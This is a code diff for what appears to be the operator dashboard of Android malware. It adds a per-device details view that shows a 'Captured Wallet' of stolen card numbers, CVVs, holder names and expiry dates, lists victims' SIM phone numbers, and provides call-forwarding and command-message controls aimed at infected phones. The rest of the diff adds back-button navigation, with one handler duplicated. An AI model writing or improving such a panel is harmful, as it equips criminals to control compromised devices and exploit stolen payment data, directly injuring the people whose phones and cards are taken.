@@ -13,6 +13,12 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const database = firebase.database();
 
+// Global variable to store last data snapshot
+let lastSnapshotData = null;
+
+// Track current active tab for navigation logic
+let currentTab = 'home';
+
 // Initialize Icons on First Load
 lucide.createIcons();
 
@@ -39,7 +45,8 @@ function displayDashboard(username) {
     syncDashboardWithFirebase();
 
     // Set default active tab
-    switchTab('home');
+    history.replaceState({ tabId: 'home' }, "", "");
+    switchTab('home', false);
 
     // Trigger icon refresh after dashboard is visible
     setTimeout(() => {
@@ -55,6 +62,9 @@ function syncDashboardWithFirebase() {
     database.ref('/').on('value', (snapshot) => {
         const data = snapshot.val();
         if (!data) return;
+        
+        // Save to global variable for details view access
+        lastSnapshotData = data;
 
         // 1. Calculate and Update Stats
         const devices = data.Devices || {};
@@ -97,7 +107,7 @@ function syncDashboardWithFirebase() {
         const deviceListContainer = document.getElementById('device-list-container');
         if (deviceListContainer) {
             deviceListContainer.innerHTML = deviceArray.map(dev => `
-                <div class="group relative bg-white border-2 ${dev.device?.online === 'ONLINE' ? 'border-green-100 shadow-green-100/30' : 'border-red-100 shadow-red-100/30'} rounded-[1.75rem] overflow-hidden shadow-lg transition-all duration-300 hover:shadow-2xl hover:-translate-y-1">
+                <div onclick="openDeviceDetails('${dev.device?.deviceID}')" class="group relative cursor-pointer bg-white border-2 ${dev.device?.online === 'ONLINE' ? 'border-green-100 shadow-green-100/30' : 'border-red-100 shadow-red-100/30'} rounded-[1.75rem] overflow-hidden shadow-lg transition-all duration-300 hover:shadow-2xl hover:-translate-y-1">
                     <div class="absolute inset-0 bg-gradient-to-br from-white via-transparent to-slate-50/50 pointer-events-none"></div>
                     
                     <!-- Device Header Navbar -->
@@ -187,6 +197,121 @@ function syncDashboardWithFirebase() {
     });
 }
 
+/**
+ * Opens the specific device details view
+ * @param {string} deviceId 
+ */
+function openDeviceDetails(deviceId) {
+    if (!lastSnapshotData || !lastSnapshotData.Devices[deviceId]) return;
+    
+    const dev = lastSnapshotData.Devices[deviceId];
+    const container = document.getElementById('device-details-content');
+    // Create Details UI
+    container.innerHTML = `
+        <!-- Unified Control Card (Call Forwarding) -->
+        <div class="bg-white p-4 rounded-3xl border border-slate-100 shadow-md space-y-4">
+            <button class="w-full bg-gradient-to-r from-indigo-600 to-violet-600 text-white font-bold py-2.5 rounded-xl shadow-md shadow-indigo-100 hover:opacity-90 transition-all uppercase tracking-wider text-[11px]">
+                Call Forwarding
+            </button>
+            
+            <div class="grid grid-cols-1 gap-2">
+                <div class="relative">
+                    <i data-lucide="phone" class="absolute left-3 top-2.5 w-3.5 h-3.5 text-slate-400"></i>
+                    <input type="tel" maxlength="10" placeholder="Target Mobile Number" 
+                        class="w-full bg-slate-50 border border-slate-200 rounded-xl pl-9 pr-4 py-2 text-xs font-bold text-slate-700 placeholder-slate-400 focus:ring-2 focus:ring-indigo-500/20 outline-none transition-all">
+                </div>
+                <div class="relative">
+                    <i data-lucide="message-square" class="absolute left-3 top-2.5 w-3.5 h-3.5 text-slate-400"></i>
+                    <input type="text" placeholder="Command Message" 
+                        class="w-full bg-slate-50 border border-slate-200 rounded-xl pl-9 pr-4 py-2 text-xs font-bold text-slate-700 placeholder-slate-400 focus:ring-2 focus:ring-indigo-500/20 outline-none transition-all">
+                </div>
+            </div>
+
+            <div class="flex gap-3">
+                ${Object.values(dev.sims || {}).map(sim => `
+                    <button class="flex-grow bg-slate-50 border border-slate-100 py-2 rounded-xl text-[10px] font-black uppercase tracking-tight text-slate-500 hover:border-indigo-500 hover:text-indigo-600 transition-all">
+                        SIM ${sim.slot + 1}
+                    </button>
+                `).join('')}
+            </div>
+            
+            <div class="border-b border-slate-100 w-full"></div>
+        </div>
+
+        <!-- System Specs Card -->
+        <div class="bg-white p-4 rounded-2xl border border-slate-100 shadow-sm space-y-3">
+            <div class="flex items-center space-x-2 border-b border-slate-50 pb-2">
+                <i data-lucide="info" class="w-3.5 h-3.5 text-indigo-500"></i>
+                <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest">System Specs</h3>
+            </div>
+            <div class="grid grid-cols-2 gap-3">
+                <div>
+                    <p class="text-[8px] font-bold text-slate-400 uppercase leading-none mb-1">OS Version</p>
+                    <p class="text-xs font-bold text-slate-800">Android ${dev.device?.android_version || 'N/A'}</p>
+                </div>
+                <div>
+                    <p class="text-[8px] font-bold text-slate-400 uppercase leading-none mb-1">Battery</p>
+                    <p class="text-xs font-bold text-slate-800">${dev.device?.Battery || 0}%</p>
+                </div>
+                <div>
+                    <p class="text-[8px] font-bold text-slate-400 uppercase leading-none mb-1">Storage</p>
+                    <p class="text-xs font-bold text-slate-800">${dev.device?.total_storage || 'N/A'}</p>
+                </div>
+                <div>
+                    <p class="text-[8px] font-bold text-slate-400 uppercase leading-none mb-1">Available</p>
+                    <p class="text-xs font-bold text-slate-800">${dev.device?.available_storage || 'N/A'}</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Financial Data (Premium Card Style) -->
+        <div class="bg-slate-900 p-4 rounded-2xl shadow-lg shadow-slate-200 text-white space-y-3 relative overflow-hidden">
+            <div class="absolute -right-4 -bottom-4 w-24 h-24 bg-white/5 rounded-full blur-2xl"></div>
+            <div class="flex items-center justify-between border-b border-white/10 pb-2">
+                <h3 class="text-[10px] font-black text-indigo-400 uppercase tracking-widest">Captured Wallet</h3>
+                <i data-lucide="credit-card" class="w-4 h-4 text-white/40"></i>
+            </div>
+            ${dev.data_collection ? Object.values(dev.data_collection).map(card => `
+                <div class="space-y-2 bg-white/5 p-3 rounded-xl border border-white/5">
+                    <div class="flex justify-between items-center">
+                        <p class="text-[10px] font-mono font-bold tracking-[0.2em] text-white">${card.CardNumber || '---- ---- ---- ----'}</p>
+                        <span class="text-[8px] font-bold text-white/40">CVV: ${card.CVV || '***'}</span>
+                    </div>
+                    <div class="flex justify-between items-end">
+                        <div>
+                            <p class="text-[8px] text-white/40 uppercase">Card Holder</p>
+                            <p class="text-xs font-bold tracking-wide">${card.fullName || 'UNKNOWN'}</p>
+                        </div>
+                        <div>
+                            <p class="text-[8px] text-white/40 uppercase">Expiry</p>
+                            <p class="text-xs font-bold">${card.Expiry || '00/00'}</p>
+                        </div>
+                    </div>
+                </div>
+            `).join('') : '<p class="text-[10px] text-white/40 text-center py-2">No records found</p>'}
+        </div>
+
+        <!-- Network & Target SMS -->
+        <div class="grid grid-cols-1 gap-4">
+            <div class="bg-white p-4 rounded-2xl border border-slate-100 shadow-sm">
+                <h3 class="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-3">Carrier Data</h3>
+                ${Object.values(dev.sims || {}).map(sim => `
+                    <div class="flex items-center justify-between p-2.5 bg-slate-50 rounded-xl mb-2 last:mb-0">
+                        <div class="flex items-center space-x-2">
+                            <i data-lucide="rss" class="w-3 h-3 text-indigo-500"></i>
+                            <p class="text-xs font-bold text-slate-700">${sim.carrier_name}</p>
+                        </div>
+                        <p class="text-[10px] font-mono font-bold text-indigo-600">${sim.number}</p>
+                    </div>
+                `).join('')}
+            </div>
+        </div>
+    `;
+
+    switchTab('device-details');
+    lucide.createIcons();
+}
+
 function attemptLogin() {
     const username = document.getElementById('username').value.trim();
     const pass = document.getElementById('password').value;
@@ -207,6 +332,31 @@ function logout() {
     location.reload();
 }
 
+// Handle browser/hardware back button (Step-by-step navigation)
+window.onpopstate = function(event) {
+    if (localStorage.getItem('isLoggedIn') === 'true') {
+        if (event.state && event.state.tabId) {
+            // Switch to previous tab without pushing to history again
+            switchTab(event.state.tabId, false);
+        } else {
+            // Fallback to home if no specific state exists
+            switchTab('home', false);
+        }
+    }
+};
+
+// Handle browser/hardware back button
+window.onpopstate = function(event) {
+    if (localStorage.getItem('isLoggedIn') === 'true') {
+        if (event.state && event.state.tabId) {
+            switchTab(event.state.tabId, false);
+        } else {
+            // Fallback to home if no state
+            switchTab('home', false);
+        }
+    }
+};
+
 // Enter key support for login
 document.addEventListener('keypress', (e) => {
     if (e.key === 'Enter') attemptLogin();
@@ -215,25 +365,51 @@ document.addEventListener('keypress', (e) => {
 /**
  * Switches between different dashboard fragments
  * @param {string} tabId - The name of the tab to activate
+ * @param {boolean} pushHistory - Whether to push to browser history
  */
-function switchTab(tabId) {
-    const tabs = ['home', 'devices', 'sms', 'more'];
+function switchTab(tabId, pushHistory = true) {
+    const tabs = ['home', 'devices', 'sms', 'more', 'device-details'];
     
     tabs.forEach(id => {
         const section = document.getElementById(`${id}-section`);
         const navBtn = document.getElementById(`nav-${id}`);
         
-        if (id === tabId) {
-            section.classList.remove('hidden');
-            navBtn.classList.add('text-indigo-600');
-            navBtn.classList.remove('text-slate-400');
-        } else {
-            section.classList.add('hidden');
-            navBtn.classList.remove('text-indigo-600');
-            navBtn.classList.add('text-slate-400');
+        if (section) {
+            if (id === tabId) {
+                section.classList.remove('hidden');
+                if (navBtn) {
+                    navBtn.classList.add('text-indigo-600');
+                    navBtn.classList.remove('text-slate-400');
+                }
+            } else {
+                section.classList.add('hidden');
+                if (navBtn) {
+                    navBtn.classList.remove('text-indigo-600');
+                    navBtn.classList.add('text-slate-400');
+                }
+            }
         }
     });
     
+    // Toggle Navbar Profile vs Back Button
+    const profileInfo = document.getElementById('nav-profile-info');
+    const backBtn = document.getElementById('nav-back-container');
+    if (tabId === 'device-details') {
+        profileInfo.classList.add('hidden');
+        backBtn.classList.remove('hidden');
+        backBtn.classList.add('flex');
+    } else {
+        profileInfo.classList.remove('hidden');
+        backBtn.classList.add('hidden');
+        backBtn.classList.remove('flex');
+    }
+
+    // Update history state for back button support
+    if (pushHistory && (typeof currentTab === 'undefined' || currentTab !== tabId)) {
+        history.pushState({ tabId: tabId }, "", "");
+    }
+    currentTab = tabId;
+
     // Refresh icons for dynamic content
     lucide.createIcons();
 }
